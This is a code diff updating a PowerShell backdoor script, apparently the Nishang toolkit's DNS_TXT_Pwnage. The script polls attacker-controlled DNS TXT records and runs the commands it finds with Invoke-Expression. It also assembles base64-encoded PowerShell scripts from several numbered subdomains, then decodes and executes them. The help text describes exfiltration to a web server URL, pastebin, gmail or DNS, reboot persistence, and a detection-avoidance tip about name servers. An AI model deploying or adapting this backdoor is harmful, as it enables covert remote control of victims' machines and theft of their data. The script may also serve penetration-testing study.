@@ -4,13 +4,16 @@ function DNS_TXT_Pwnage
 {
 <#
 .SYNOPSIS
-Payload which acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.
+A backdoor capable of recieving commands and PowerShell scripts from DNS TXT queries.
 
 .DESCRIPTION
-This payload continuously queries a subdomain's TXT records. It could be sent commands and powershell scripts to be 
-executed on the target machine by TXT messages of a domain. The powershell scripts which would be served as TXT record MUST be encoded using Invoke-Encode.ps1 in the utility folder.
-Please keep in mind the maximum lenght of DNS TXT record supported by the provider you use. ZoneEdit, which is used to test this, provides lenght of 1024 characters. 
-If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode.
+This script continuously queries a domain's TXT records. It could be sent commands and powershell scripts using the TXT records which are executed on the target machine.
+The PowerShell script which would be served as TXT record must be generated using Out-DnsTxt.ps1 in the Utility folder.
+
+While using the AuthNS option it should be kept in mind that it increases chances of detection.
+Leaving the DNS resolution to authorised name server of a target environment may be more desirable.
+
+If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode the exfiltrated data.
 
 .PARAMETER startdomain
 The domain (or subdomain) whose TXT records would be checked regularly for further instructions.
@@ -25,14 +28,18 @@ The domain (or subdomain) whose TXT records would be used to issue commands to t
  The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for encoded powershell script. 
 
 .PARAMETER psdomain
-The domain (or subdomain) which would be used to provide powershell scripts from its TXT records.
+The domain (or subdomain) whose subdomains would be used to provide powershell scripts from TXT records.
+
+.PARAMETER subdomains
+The number of subdomains which would be used to provide powershell scripts from their TXT records.
+The length of DNS TXT records is assumed to be 255 characters, so more than one subdomains would be required.
 
 .PARAMETER stopstring
 The string, if responded by TXT record of startdomain, will stop this payload on the target.
 
-.PARAMETER AUTHNS
-Authoritative Name Server for the domains (or startdomain in case you are using separate domains). Startdomain 
-would be changed for commands and an authoritative reply shoudl reflect changes immediately.
+.PARAMETER AuthNS
+Authoritative Name Server for the domains (or for startdomain in case you are using separate domains). 
+Startdomain would be changed for commands and an authoritative reply shoudl reflect changes immediately.
 
 .PARAMETER exfil
 Use this option for using exfiltration
@@ -64,10 +71,11 @@ Authoritative Name Server for the domain specified in DomainName. Using it may i
 Usually, you should let the Name Server of target to resolve things for you.
 
 .PARAMETER persist
-Use this parameter for reboot persistence
+Use this parameter for reboot persistence. 
+Use Remove-Peristence from the Utility folder to clean a target machine.
 
 .PARAMETER NoLoadFunction
-This parameter is used for specifying that the script used in txt records $psdomain does NOT contain a function.
+This parameter is used for specifying that the script used in txt records $psdomain does NOT load a function.
 If the parameter is not specified the payload assumes that the script pulled from txt records would need function name to be executed.
 This need not be specified if you are using Nishang scripts with this backdoor.
 
@@ -76,14 +84,15 @@ PS > DNS_TXT_Pwnage
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
 In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
 must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
 you want to execute. The TXT record could be changed live and the payload will pick up updated 
 record to execute new command.
 
 To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
-psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.
+1.script.alteredsecurity.com, 2.script.alteredsecurity.com and 3.script.alteredsecurity.com looking for a base64encoded powershell script. 
+Use the Out-DnsTxt script in the Utility folder to encode scripts to base64.
 
 .EXAMPLE
 PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com -exfil -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
@@ -94,7 +103,7 @@ PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincomma
 Use above for reboot persistence.
 
 .LINK
-http://labofapenetrationtester.com/
+http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
 https://github.com/samratashok/nishang
 #>
 
@@ -139,37 +148,42 @@ https://github.com/samratashok/nishang
         [Parameter(Position = 5, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 5, Mandatory = $True, Parametersetname="noexfil")]
         [String]
-        $StopString,
+        $Subdomains,
 
         [Parameter(Position = 6, Mandatory = $True, Parametersetname="exfil")]
         [Parameter(Position = 6, Mandatory = $True, Parametersetname="noexfil")]
+        [String]
+        $StopString,
+
+        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 7, Mandatory = $False, Parametersetname="noexfil")]
         [String]$AuthNS,    
 
-        [Parameter(Position = 7, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
+        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")] [ValidateSet("gmail","pastebin","WebServer","DNS")]
         [String]
         $ExfilOption,
 
-        [Parameter(Position = 8, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $dev_key = "null",
 
-        [Parameter(Position = 9, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $username = "null",
 
-        [Parameter(Position = 10, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $password = "null",
 
-        [Parameter(Position = 11, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 12, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $URL = "null",
       
-        [Parameter(Position = 12, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 13, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $DomainName = "null",
 
-        [Parameter(Position = 13, Mandatory = $False, Parametersetname="exfil")]
+        [Parameter(Position = 14, Mandatory = $False, Parametersetname="exfil")]
         [String]
         $ExfilNS = "null"
    
@@ -182,13 +196,21 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
     {
         $exec = 0
         start-sleep -seconds 5
-        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
+        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
+        if ($AuthNS -ne $null)
+        {
+            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
+        }
         $tmp = $getcode | select-string -pattern "`""
         $startcode = $tmp -split("`"")[0]
         if ($startcode[1] -eq $cmdstring)
         {
             start-sleep -seconds 5
-            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
+            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
+            if ($AuthNS -ne $null)
+            {
+                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
+            } 
             $temp = $getcommand | select-string -pattern "`""
             $command = $temp -split("`"")[0]
             $pastevalue = Invoke-Expression $command[1]
@@ -208,15 +230,20 @@ function DNS-TXT-Logic ($Startdomain, $cmdstring, $commanddomain, $psstring, $ps
         if ($startcode[1] -match $psstring)
         {
                       
-            $getcommand = (Invoke-Expression "nslookup -querytype=txt $psdomain $AuthNS") 
-            $temp = $getcommand | select-string -pattern "`""
-            $tmp1 = ""
-            foreach ($txt in $temp)
+            $i = 1
+            while ($i -le $subdomains)
             {
-                $tmp1 = $tmp1 + $txt
+                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain") 
+                if ($AuthNS -ne $null)
+                {
+                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS") 
+                }
+                $temp = $getcommand | select-string -pattern "`""
+                $tmp1 = ""
+                $tmp1 = $tmp1 + $temp
+                $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
+                $i++
             }
-            $encdata = $tmp1 -replace '\s+', "" -replace "`"", ""
-            $encdata
             #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
             $dec = [System.Convert]::FromBase64String($encdata)
             $ms = New-Object System.IO.MemoryStream
